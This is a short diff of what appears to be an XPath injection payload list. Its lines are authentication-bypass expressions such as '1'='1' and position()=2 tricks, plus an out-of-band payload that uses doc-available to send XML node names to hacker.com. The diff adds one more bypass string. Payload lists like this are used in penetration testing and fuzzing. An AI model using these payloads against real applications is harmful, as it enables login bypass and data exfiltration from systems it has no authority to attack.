@@ -99,3 +99,4 @@ string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/tex
 doc-available(concat("http://hacker.com/oob/", name(/*[1]/*[1]), name(/*[1]/*[1]/*[1])))
 string(//user[name/text()=''or position()=2 or'' and password/text()='']/account/text())
 string(//user[name/text()='' or '1'='1' and password/text()='' or '1'='1']/account/text())
+" or "admin
